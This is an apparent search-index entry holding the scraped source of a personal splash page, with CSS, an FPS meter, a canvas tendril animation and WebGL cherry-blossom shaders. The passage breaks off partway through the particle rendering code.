{"pages":[{"title":"404","text":"","link":"/404.html"},{"title":"","text":"Six &bull; 逸尘秀 * { margin: 0; padding: 0; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -ms-box-sizing: border-box; -o-box-sizing: border-box; box-sizing: border-box; } html, body { margin: 0; padding: 0; font: 16px/1.4 'Lato', sans-serif; color: #fefeff; -webkit-font-smoothing: antialiased; font-smoothing: antialiased; } body { background: rgb(8,5,16); overflow:hidden; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; } h1 { font: 2.75em 'Cinzel', serif; font-weight: 400; letter-spacing: 0.35em; text-shadow: 0 0 25px rgba(254,254,255,0.85); } h2 { font: 1.45em 'Cinzel', serif; font-weight: 400; letter-spacing: 0.5em; text-shadow: 0 0 25px rgba(254,254,255,0.85); text-transform: lowercase; } [class^=\"letter\"] { -webkit-transition: opacity 3s ease; -moz-transition: opacity 3s ease; transition: opacity 3s ease; } .letter-0 { transition-delay: 0.2s; } .letter-1 { transition-delay: 0.4s; } .letter-2 { transition-delay: 0.6s; } .letter-3 { transition-delay: 0.8s; } .letter-4 { transition-delay: 1.0s; } .letter-5 { transition-delay: 1.2s; } .letter-6 { transition-delay: 1.4s; } .letter-7 { transition-delay: 1.6s; } .letter-8 { transition-delay: 1.8s; } .letter-9 { transition-delay: 2.0s; } .letter-10 { transition-delay: 2.2s; } .letter-11 { transition-delay: 2.4s; } .letter-12 { transition-delay: 2.6s; } .letter-13 { transition-delay: 2.8s; } .letter-14 { transition-delay: 3.0s; } h1, h2 { visibility: hidden; -webkit-transform: translate3d(0, 0, 0); -moz-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); } h1.transition-in, h2.transition-in { visibility: visible; } h1 [class^=\"letter\"], h2 [class^=\"letter\"]{ opacity: 0; } h1.transition-in [class^=\"letter\"], h2.transition-in [class^=\"letter\"]{ opacity: 1; } #container { display: table; position: absolute; z-index: 20; width: 100%; height: 100%; text-align: center; cursor: none; left: 15px; } #container > div { display: table-cell; vertical-align: middle; } #container p { position: absolute; width: 100%; left: 0; bottom: 25px; font-size: 0.8em; letter-spacing: 0.1em; font-weight: 300; color: #76747a; -webkit-font-smoothing: subpixel-antialiased; font-smoothing: subpixel-antialiased; } #container p strong { color: #b3abc5; font-size: 5em; } #container p span { font-size: 0.75em; padding: 0 2px; } #canvas { position: absolute; z-index: 10; top: 0; left: 0; width: 100%; height: 100%; cursor: none; } #stats { position: absolute; z-index: 10; left: 10px; top: 10px; } .dg.ac { z-index: 100 !important; } #container div p strong a { color: #999; font-size: 0.5em; } body,td,th { font-family: Lato, sans-serif; } a:link { text-decoration: none; } a:visited { text-decoration: none; } a:hover { text-decoration: none; } a:active { text-decoration: none; } body { padding:0; margin:0; overflow:hidden; height: 600px; } canvas { padding:0; margin:0; } div.btnbg { position:fixed; left:0; top:0; } html{ width: 100%; height: 100%; overflow: hidden; font-style: sans-serif; } body{ width: 100%; height: 100%; font-family: 'Open Sans',sans-serif; margin: 0; } #login{ position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; } #login h1{ color: #fff; text-shadow:0 0 10px; letter-spacing: 1px; text-align: center; } h1{ font-size: 2em; margin: 0.67em 0; } input{ width: 300px; height: 40px; margin-bottom: 10px; outline: none; padding: 10px; font-size: 13px; color: #fff; text-shadow:1px 1px 1px; border-top: 1px solid #312E3D; border-left: 1px solid #312E3D; border-right: 1px solid #312E3D; border-bottom: 1px solid #56536A; border-radius: 4px; background-color: #2D2D3F; } .but{ width: 300px; min-height: 20px; display: block; background-color: #4a77d4; border: 1px solid #3762bc; color: #fff; padding: 9px 14px; font-size: 15px; line-height: normal; border-radius: 5px; margin: 0; } Six&bull;逸尘秀 [ 只此一生 必须快乐！ ] &nbsp; 进入主站 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; var Stats=function(){var e=Date.now(),t=e,i=0,n=1/0,r=0,s=0,o=1/0,a=0,l=0,h=0,c=document.createElement(\"div\");c.id=\"stats\",c.addEventListener(\"mousedown\",function(e){e.preventDefault(),v(++h%2)},!1),c.style.cssText=\"width:80px;opacity:0.9;cursor:pointer\";var u=document.createElement(\"div\");u.id=\"fps\",u.style.cssText=\"padding:0 0 3px 3px;text-align:left;background-color:#002\",c.appendChild(u);var d=document.createElement(\"div\");d.id=\"fpsText\",d.style.cssText=\"color:#0ff;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px\",d.innerHTML=\"FPS\",u.appendChild(d);var p=document.createElement(\"div\");for(p.id=\"fpsGraph\",p.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0ff\",u.appendChild(p);74>p.children.length;){var f=document.createElement(\"span\");f.style.cssText=\"width:1px;height:30px;float:left;background-color:#113\",p.appendChild(f)}var m=document.createElement(\"div\");m.id=\"ms\",m.style.cssText=\"padding:0 0 3px 3px;text-align:left;background-color:#020;display:none\",c.appendChild(m);var g=document.createElement(\"div\");g.id=\"msText\",g.style.cssText=\"color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px\",g.innerHTML=\"MS\",m.appendChild(g);var y=document.createElement(\"div\");for(y.id=\"msGraph\",y.style.cssText=\"position:relative;width:74px;height:30px;background-color:#0f0\",m.appendChild(y);74>y.children.length;){var f=document.createElement(\"span\");f.style.cssText=\"width:1px;height:30px;float:left;background-color:#131\",y.appendChild(f)}var v=function(e){switch(h=e){case 0:u.style.display=\"block\",m.style.display=\"none\";break;case 1:u.style.display=\"none\",m.style.display=\"block\"}},b=function(e,t){var i=e.appendChild(e.firstChild);i.style.height=t+\"px\"};return{REVISION:11,domElement:c,setMode:v,begin:function(){e=Date.now()},end:function(){var h=Date.now();return i=h-e,n=Math.min(n,i),r=Math.max(r,i),g.textContent=i+\" MS (\"+n+\"-\"+r+\")\",b(y,Math.min(30,30-30*(i/200))),l++,h>t+1e3&&(s=Math.round(1e3*l/(h-t)),o=Math.min(o,s),a=Math.max(a,s),d.textContent=s+\" FPS (\"+o+\"-\"+a+\")\",b(p,Math.min(30,30-30*(s/100))),t=h,l=0),h},update:function(){e=this.end()}}}; ;(function(window) { var ctx, hue, logo, form, buffer, target = {}, tendrils = [], settings = {}; settings.debug = true; settings.friction = 0.5; settings.trails = 20; settings.size = 50; settings.dampening = 0.25; settings.tension = 0.98; Math.TWO_PI = Math.PI * 2; // ======================================================================================== // Oscillator // ---------------------------------------------------------------------------------------- function Oscillator(options) { this.init(options || {}); } Oscillator.prototype = (function() { var value = 0; return { init: function(options) { this.phase = options.phase || 0; this.offset = options.offset || 0; this.frequency = options.frequency || 0.001; this.amplitude = options.amplitude || 1; }, update: function() { this.phase += this.frequency; value = this.offset + Math.sin(this.phase) * this.amplitude; return value; }, value: function() { return value; } }; })(); // ======================================================================================== // Tendril // ---------------------------------------------------------------------------------------- function Tendril(options) { this.init(options || {}); } Tendril.prototype = (function() { function Node() { this.x = 0; this.y = 0; this.vy = 0; this.vx = 0; } return { init: function(options) { this.spring = options.spring + (Math.random() * 0.1) - 0.05; this.friction = settings.friction + (Math.random() * 0.01) - 0.005; this.nodes = []; for(var i = 0, node; i < settings.size; i++) { node = new Node(); node.x = target.x; node.y = target.y; this.nodes.push(node); } }, update: function() { var spring = this.spring, node = this.nodes[0]; node.vx += (target.x - node.x) * spring; node.vy += (target.y - node.y) * spring; for(var prev, i = 0, n = this.nodes.length; i < n; i++) { node = this.nodes[i]; if(i > 0) { prev = this.nodes[i - 1]; node.vx += (prev.x - node.x) * spring; node.vy += (prev.y - node.y) * spring; node.vx += prev.vx * settings.dampening; node.vy += prev.vy * settings.dampening; } node.vx *= this.friction; node.vy *= this.friction; node.x += node.vx; node.y += node.vy; spring *= settings.tension; } }, draw: function() { var x = this.nodes[0].x, y = this.nodes[0].y, a, b; ctx.beginPath(); ctx.moveTo(x, y); for(var i = 1, n = this.nodes.length - 2; i < n; i++) { a = this.nodes[i]; b = this.nodes[i + 1]; x = (a.x + b.x) * 0.5; y = (a.y + b.y) * 0.5; ctx.quadraticCurveTo(a.x, a.y, x, y); } a = this.nodes[i]; b = this.nodes[i + 1]; ctx.quadraticCurveTo(a.x, a.y, b.x, b.y); ctx.stroke(); ctx.closePath(); } }; })(); // ---------------------------------------------------------------------------------------- function init(event) { document.removeEventListener('mousemove', init); document.removeEventListener('touchstart', init); document.addEventListener('mousemove', mousemove); document.addEventListener('touchmove', mousemove); document.addEventListener('touchstart', touchstart); mousemove(event); reset(); loop(); } function reset() { tendrils = []; for(var i = 0; i < settings.trails; i++) { tendrils.push(new Tendril({ spring: 0.45 + 0.025 * (i / settings.trails) })); } } function loop() { if(!ctx.running) return; ctx.globalCompositeOperation = 'source-over'; ctx.fillStyle = 'rgba(8,5,16,0.4)'; ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height); ctx.globalCompositeOperation = 'lighter'; ctx.strokeStyle = 'hsla(' + Math.round(hue.update()) + ',90%,50%,0.25)'; ctx.lineWidth = 1; if(ctx.frame % 60 == 0) { console.log(hue.update(), Math.round(hue.update()), hue.phase, hue.offset, hue.frequency, hue.amplitude); } for(var i = 0, tendril; i < settings.trails; i++) { tendril = tendrils[i]; tendril.update(); tendril.draw(); } ctx.frame++; ctx.stats.update(); requestAnimFrame(loop); } function resize() { ctx.canvas.width = window.innerWidth; ctx.canvas.height = window.innerHeight; } function start() { if(!ctx.running) { ctx.running = true; loop(); } } function stop() { ctx.running = false; } function mousemove(event) { if(event.touches) { target.x = event.touches[0].pageX; target.y = event.touches[0].pageY; } else { target.x = event.clientX target.y = event.clientY; } event.preventDefault(); } function touchstart(event) { if(event.touches.length == 1) { target.x = event.touches[0].pageX; target.y = event.touches[0].pageY; } } function keyup(event) { switch(event.keyCode) { case 32: save(); break; default: // console.log(event.keyCode); } } function letters(id) { var el = document.getElementById(id), letters = el.innerHTML.replace('&amp;', '&').split(''), heading = ''; for(var i = 0, n = letters.length, letter; i < n; i++) { letter = letters[i].replace('&', '&amp'); heading += letter.trim() ? '' + letter + '' : '&nbsp;'; } el.innerHTML = heading; setTimeout(function() { el.className = 'transition-in'; }, (Math.random() * 500) + 500); } function save() { if(!buffer) { buffer = document.createElement('canvas'); buffer.width = screen.availWidth; buffer.height = screen.availHeight; buffer.ctx = buffer.getContext('2d'); form = document.createElement('form'); form.method = 'post'; form.input = document.createElement('input'); form.input.type = 'hidden'; form.input.name = 'data'; form.appendChild(form.input); document.body.appendChild(form); } buffer.ctx.fillStyle = 'rgba(8,5,16)'; buffer.ctx.fillRect(0, 0, buffer.width, buffer.height); buffer.ctx.drawImage(canvas, Math.round(buffer.width / 2 - canvas.width / 2), Math.round(buffer.height / 2 - canvas.height / 2) ); buffer.ctx.drawImage(logo, Math.round(buffer.width / 2 - logo.width / 4), Math.round(buffer.height / 2 - logo.height / 4), logo.width / 2, logo.height / 2 ); window.open(buffer.toDataURL(), 'wallpaper', 'top=0,left=0,width=' + buffer.width + ',height=' + buffer.height); // form.input.value = buffer.toDataURL().substr(22); // form.submit(); } window.requestAnimFrame = (function() { return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(fn) { window.setTimeout(fn, 1000 / 60) }; })(); window.onload = function() { ctx = document.getElementById('canvas').getContext('2d'); ctx.stats = new Stats(); ctx.running = true; ctx.frame = 1; logo = new Image(); hue = new Oscillator({ phase: Math.random() * Math.TWO_PI, amplitude: 85, frequency: 0.0015, offset: 285 }); letters('h1'); letters('h2'); document.addEventListener('mousemove', init); document.addEventListener('touchstart', init); document.body.addEventListener('orientationchange', resize); window.addEventListener('resize', resize); window.addEventListener('keyup', keyup); window.addEventListener('focus', start); window.addEventListener('blur', stop); resize(); if(window.DEBUG) { var gui = new dat.GUI(); // gui.add(settings, 'debug'); settings.gui.add(settings, 'trails', 1, 30).onChange(reset); settings.gui.add(settings, 'size', 25, 75).onFinishChange(reset); settings.gui.add(settings, 'friction', 0.45, 0.55).onFinishChange(reset); settings.gui.add(settings, 'dampening', 0.01, 0.4).onFinishChange(reset); settings.gui.add(settings, 'tension', 0.95, 0.999).onFinishChange(reset); document.body.appendChild(ctx.stats.domElement); } }; })(window); uniform mat4 uProjection; uniform mat4 uModelview; uniform vec3 uResolution; uniform vec3 uOffset; uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start attribute vec3 aPosition; attribute vec3 aEuler; attribute vec2 aMisc; //x:size, y:fade varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; void main(void) { // Projection is based on vertical angle vec4 pos = uModelview * vec4(aPosition + uOffset, 1.0); gl_Position = uProjection * pos; gl_PointSize = aMisc.x * uProjection[1][1] / -pos.z * uResolution.y * 0.5; pposition = pos.xyz; psize = aMisc.x; pdist = length(pos.xyz); palpha = smoothstep(0.0, 1.0, (pdist - 0.1) / uFade.z); vec3 elrsn = sin(aEuler); vec3 elrcs = cos(aEuler); mat3 rotx = mat3( 1.0, 0.0, 0.0, 0.0, elrcs.x, elrsn.x, 0.0, -elrsn.x, elrcs.x ); mat3 roty = mat3( elrcs.y, 0.0, -elrsn.y, 0.0, 1.0, 0.0, elrsn.y, 0.0, elrcs.y ); mat3 rotz = mat3( elrcs.z, elrsn.z, 0.0, -elrsn.z, elrcs.z, 0.0, 0.0, 0.0, 1.0 ); mat3 rotmat = rotx * roty * rotz; normal = rotmat[2]; mat3 trrotm = mat3( rotmat[0][0], rotmat[1][0], rotmat[2][0], rotmat[0][1], rotmat[1][1], rotmat[2][1], rotmat[0][2], rotmat[1][2], rotmat[2][2] ); normX = trrotm[0]; normY = trrotm[1]; normZ = trrotm[2]; const vec3 lit = vec3(0.6917144638660746, 0.6917144638660746, -0.20751433915982237); float tmpdfs = dot(lit, normal); if(tmpdfs < 0.0) { normal = -normal; tmpdfs = dot(lit, normal); } diffuse = 0.4 + tmpdfs; vec3 eyev = normalize(-pos.xyz); if(dot(eyev, normal) > 0.0) { vec3 hv = normalize(eyev + lit); specular = pow(max(dot(hv, normal), 0.0), 20.0); } else { specular = 0.0; } rstop = clamp((abs(pdist - uDOF.x) - uDOF.y) / uDOF.z, 0.0, 1.0); rstop = pow(rstop, 0.5); //-0.69315 = ln(0.5) distancefade = min(1.0, exp((uFade.x - pdist) * 0.69315 / uFade.y)); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start const vec3 fadeCol = vec3(0.08, 0.03, 0.06); varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; float ellipse(vec2 p, vec2 o, vec2 r) { vec2 lp = (p - o) / r; return length(lp) - 1.0; } void main(void) { vec3 p = vec3(gl_PointCoord - vec2(0.5, 0.5), 0.0) * 2.0; vec3 d = vec3(0.0, 0.0, -1.0); float nd = normZ.z; //dot(-normZ, d); if(abs(nd) < 0.0001) discard; float np = dot(normZ, p); vec3 tp = p + d * np / nd; vec2 coord = vec2(dot(normX, tp), dot(normY, tp)); //angle = 15 degree const float flwrsn = 0.258819045102521; const float flwrcs = 0.965925826289068; mat2 flwrm = mat2(flwrcs, -flwrsn, flwrsn, flwrcs); vec2 flwrp = vec2(abs(coord.x), coord.y) * flwrm; float r; if(flwrp.x < 0.0) { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.36, 0.96) * 0.5); } else { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.58, 0.96) * 0.5); } if(r > rstop) discard; vec3 col = mix(vec3(1.0, 0.8, 0.75), vec3(1.0, 0.9, 0.87), r); float grady = mix(0.0, 1.0, pow(coord.y * 0.5 + 0.5, 0.35)); col *= vec3(1.0, grady, grady); col *= mix(0.8, 1.0, pow(abs(coord.x), 0.3)); col = col * diffuse + specular; col = mix(fadeCol, col, distancefade); float alpha = (rstop > 0.001)? (0.5 - r / (rstop * 2.0)) : 1.0; alpha = smoothstep(0.0, 1.0, alpha) * palpha; gl_FragColor = vec4(col * 0.5, alpha); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec2 uTimes; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec3 col; float c; vec2 tmpv = texCoord * vec2(0.8, 1.0) - vec2(0.95, 1.0); c = exp(-pow(length(tmpv) * 1.8, 2.0)); col = mix(vec3(0.02, 0.0, 0.03), vec3(0.96, 0.98, 1.0) * 1.5, c); gl_FragColor = vec4(col * 0.5, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); gl_FragColor = vec4(col.rgb * 2.0 - vec3(0.5), 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; uniform vec4 uBlurDir; //dir(x, y), stride(z, w) varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); col = col + texture2D(uSrc, texCoord + uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord - uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord + (uBlurDir.xy + uBlurDir.zw) * uDelta); col = col + texture2D(uSrc, texCoord - (uBlurDir.xy + uBlurDir.zw) * uDelta); gl_FragColor = col / 5.0; } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_FragColor = texture2D(uSrc, texCoord); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform sampler2D uBloom; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 srccol = texture2D(uSrc, texCoord) * 2.0; vec4 bloomcol = texture2D(uBloom, texCoord); vec4 col; col = srccol + bloomcol * (vec4(1.0) + srccol); col *= smoothstep(1.0, 0.0, pow(length((texCoord - vec2(0.5)) * 2.0), 1.2) * 0.5); col = pow(col, vec4(0.45454545454545)); //(1.0 / 2.2) gl_FragColor = vec4(col.rgb, 1.0); gl_FragColor.a = 1.0; } // Utilities var Vector3 = {}; var Matrix44 = {}; Vector3.create = function(x, y, z) { return {'x':x, 'y':y, 'z':z}; }; Vector3.dot = function (v0, v1) { return v0.x * v1.x + v0.y * v1.y + v0.z * v1.z; }; Vector3.cross = function (v, v0, v1) { v.x = v0.y * v1.z - v0.z * v1.y; v.y = v0.z * v1.x - v0.x * v1.z; v.z = v0.x * v1.y - v0.y * v1.x; }; Vector3.normalize = function (v) { var l = v.x * v.x + v.y * v.y + v.z * v.z; if(l > 0.00001) { l = 1.0 / Math.sqrt(l); v.x *= l; v.y *= l; v.z *= l; } }; Vector3.arrayForm = function(v) { if(v.array) { v.array[0] = v.x; v.array[1] = v.y; v.array[2] = v.z; } else { v.array = new Float32Array([v.x, v.y, v.z]); } return v.array; }; Matrix44.createIdentity = function () { return new Float32Array([1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0]); }; Matrix44.loadProjection = function (m, aspect, vdeg, near, far) { var h = near * Math.tan(vdeg * Math.PI / 180.0 * 0.5) * 2.0; var w = h * aspect; m[0] = 2.0 * near / w; m[1] = 0.0; m[2] = 0.0; m[3] = 0.0; m[4] = 0.0; m[5] = 2.0 * near / h; m[6] = 0.0; m[7] = 0.0; m[8] = 0.0; m[9] = 0.0; m[10] = -(far + near) / (far - near); m[11] = -1.0; m[12] = 0.0; m[13] = 0.0; m[14] = -2.0 * far * near / (far - near); m[15] = 0.0; }; Matrix44.loadLookAt = function (m, vpos, vlook, vup) { var frontv = Vector3.create(vpos.x - vlook.x, vpos.y - vlook.y, vpos.z - vlook.z); Vector3.normalize(frontv); var sidev = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(sidev, vup, frontv); Vector3.normalize(sidev); var topv = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(topv, frontv, sidev); Vector3.normalize(topv); m[0] = sidev.x; m[1] = topv.x; m[2] = frontv.x; m[3] = 0.0; m[4] = sidev.y; m[5] = topv.y; m[6] = frontv.y; m[7] = 0.0; m[8] = sidev.z; m[9] = topv.z; m[11] = frontv.z; m[11] = 0.0; m[12] = -(vpos.x * m[0] + vpos.y * m[4] + vpos.z * m[8]); m[13] = -(vpos.x * m[1] + vpos.y * m[5] + vpos.z * m[9]); m[14] = -(vpos.x * m[2] + vpos.y * m[6] + vpos.z * m[10]); m[15] = 1.0; }; // var timeInfo = { 'start':0, 'prev':0, // Date 'delta':0, 'elapsed':0 // Number(sec) }; // var gl; var renderSpec = { 'width':0, 'height':0, 'aspect':1, 'array':new Float32Array(3), 'halfWidth':0, 'halfHeight':0, 'halfArray':new Float32Array(3) // and some render targets. see setViewport() }; renderSpec.setSize = function(w, h) { renderSpec.width = w; renderSpec.height = h; renderSpec.aspect = renderSpec.width / renderSpec.height; renderSpec.array[0] = renderSpec.width; renderSpec.array[1] = renderSpec.height; renderSpec.array[2] = renderSpec.aspect; renderSpec.halfWidth = Math.floor(w / 2); renderSpec.halfHeight = Math.floor(h / 2); renderSpec.halfArray[0] = renderSpec.halfWidth; renderSpec.halfArray[1] = renderSpec.halfHeight; renderSpec.halfArray[2] = renderSpec.halfWidth / renderSpec.halfHeight; }; function deleteRenderTarget(rt) { gl.deleteFramebuffer(rt.frameBuffer); gl.deleteRenderbuffer(rt.renderBuffer); gl.deleteTexture(rt.texture); } function createRenderTarget(w, h) { var ret = { 'width':w, 'height':h, 'sizeArray':new Float32Array([w, h, w / h]), 'dtxArray':new Float32Array([1.0 / w, 1.0 / h]) }; ret.frameBuffer = gl.createFramebuffer(); ret.renderBuffer = gl.createRenderbuffer(); ret.texture = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, ret.texture); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR); gl.bindFramebuffer(gl.FRAMEBUFFER, ret.frameBuffer); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, ret.texture, 0); gl.bindRenderbuffer(gl.RENDERBUFFER, ret.renderBuffer); gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, w, h); gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, ret.renderBuffer); gl.bindTexture(gl.TEXTURE_2D, null); gl.bindRenderbuffer(gl.RENDERBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, null); return ret; } function compileShader(shtype, shsrc) { var retsh = gl.createShader(shtype); gl.shaderSource(retsh, shsrc); gl.compileShader(retsh); if(!gl.getShaderParameter(retsh, gl.COMPILE_STATUS)) { var errlog = gl.getShaderInfoLog(retsh); gl.deleteShader(retsh); console.error(errlog); return null; } return retsh; } function createShader(vtxsrc, frgsrc, uniformlist, attrlist) { var vsh = compileShader(gl.VERTEX_SHADER, vtxsrc); var fsh = compileShader(gl.FRAGMENT_SHADER, frgsrc); if(vsh == null || fsh == null) { return null; } var prog = gl.createProgram(); gl.attachShader(prog, vsh); gl.attachShader(prog, fsh); gl.deleteShader(vsh); gl.deleteShader(fsh); gl.linkProgram(prog); if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) { var errlog = gl.getProgramInfoLog(prog); console.error(errlog); return null; } if(uniformlist) { prog.uniforms = {}; for(var i = 0; i < uniformlist.length; i++) { prog.uniforms[uniformlist[i]] = gl.getUniformLocation(prog, uniformlist[i]); } } if(attrlist) { prog.attributes = {}; for(var i = 0; i < attrlist.length; i++) { var attr = attrlist[i]; prog.attributes[attr] = gl.getAttribLocation(prog, attr); } } return prog; } function useShader(prog) { gl.useProgram(prog); for(var attr in prog.attributes) { gl.enableVertexAttribArray(prog.attributes[attr]);; } } function unuseShader(prog) { for(var attr in prog.attributes) { gl.disableVertexAttribArray(prog.attributes[attr]);; } gl.useProgram(null); } ///// var projection = { 'angle':60, 'nearfar':new Float32Array([0.1, 100.0]), 'matrix':Matrix44.createIdentity() }; var camera = { 'position':Vector3.create(0, 0, 100), 'lookat':Vector3.create(0, 0, 0), 'up':Vector3.create(0, 1, 0), 'dof':Vector3.create(10.0, 4.0, 8.0), 'matrix':Matrix44.createIdentity() }; var pointFlower = {}; var meshFlower = {}; var sceneStandBy = false; var BlossomParticle = function () { this.velocity = new Array(3); this.rotation = new Array(3); this.position = new Array(3); this.euler = new Array(3); this.size = 1.0; this.alpha = 1.0; this.zkey = 0.0; }; BlossomParticle.prototype.setVelocity = function (vx, vy, vz) { this.velocity[0] = vx; this.velocity[1] = vy; this.velocity[2] = vz; }; BlossomParticle.prototype.setRotation = function (rx, ry, rz) { this.rotation[0] = rx; this.rotation[1] = ry; this.rotation[2] = rz; }; BlossomParticle.prototype.setPosition = function (nx, ny, nz) { this.position[0] = nx; this.position[1] = ny; this.position[2] = nz; }; BlossomParticle.prototype.setEulerAngles = function (rx, ry, rz) { this.euler[0] = rx; this.euler[1] = ry; this.euler[2] = rz; }; BlossomParticle.prototype.setSize = function (s) { this.size = s; }; BlossomParticle.prototype.update = function (dt, et) { this.position[0] += this.velocity[0] * dt; this.position[1] += this.velocity[1] * dt; this.position[2] += this.velocity[2] * dt; this.euler[0] += this.rotation[0] * dt; this.euler[1] += this.rotation[1] * dt; this.euler[2] += this.rotation[2] * dt; }; function createPointFlowers() { // get point sizes var prm = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE); renderSpec.pointSize = {'min':prm[0], 'max':prm[1]}; var vtxsrc = document.getElementById(\"sakura_point_vsh\").textContent; var frgsrc = document.getElementById(\"sakura_point_fsh\").textContent; pointFlower.program = createShader( vtxsrc, frgsrc, ['uProjection', 'uModelview', 'uResolution', 'uOffset', 'uDOF', 'uFade'], ['aPosition', 'aEuler', 'aMisc'] ); useShader(pointFlower.program); pointFlower.offset = new Float32Array([0.0, 0.0, 0.0]); pointFlower.fader = Vector3.create(0.0, 10.0, 0.0); // paramerters: velocity[3], rotate[3] pointFlower.numFlowers = 1600; pointFlower.particles = new Array(pointFlower.numFlowers); // vertex attributes {position[3], euler_xyz[3], size[1]} pointFlower.dataArray = new Float32Array(pointFlower.numFlowers * (3 + 3 + 2)); pointFlower.positionArrayOffset = 0; pointFlower.eulerArrayOffset = pointFlower.numFlowers * 3; pointFlower.miscArrayOffset = pointFlower.numFlowers * 6; pointFlower.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(pointFlower.program); for(var i = 0; i < pointFlower.numFlowers; i++) { pointFlower.particles[i] = new BlossomParticle(); } } function initPointFlowers() { //area pointFlower.area = Vector3.create(20.0, 20.0, 20.0); pointFlower.area.x = pointFlower.area.y * renderSpec.aspect; pointFlower.fader.x = 10.0; //env fade start pointFlower.fader.y = pointFlower.area.z; //env fade half pointFlower.fader.z = 0.1; //near fade start //particles var PI2 = Math.PI * 2.0; var tmpv3 = Vector3.create(0, 0, 0); var tmpv = 0; var symmetryrand = function() {return (Math.random() * 2.0 - 1.0);}; for(var i = 0; i < pointFlower.numFlowers; i++) { var tmpprtcl = pointFlower.particles[i]; //velocity tmpv3.x = symmetryrand() * 0.3 + 0.8; tmpv3.y = symmetryrand() * 0.2 - 1.0; tmpv3.z = symmetryrand() * 0.3 + 0.5; Vector3.normalize(tmpv3); tmpv = 2.0 + Math.random() * 1.0; tmpprtcl.setVelocity(tmpv3.x * tmpv, tmpv3.y * tmpv, tmpv3.z * tmpv); //rotation tmpprtcl.setRotation( symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5 ); //position tmpprtcl.setPosition( symmetryrand() * pointFlower.area.x, symmetryrand() * pointFlower.area.y, symmetryrand() * pointFlower.area.z ); //euler tmpprtcl.setEulerAngles( Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0 ); //size tmpprtcl.setSize(0.9 + Math.random() * 0.1); } } function renderPointFlowers() { //update 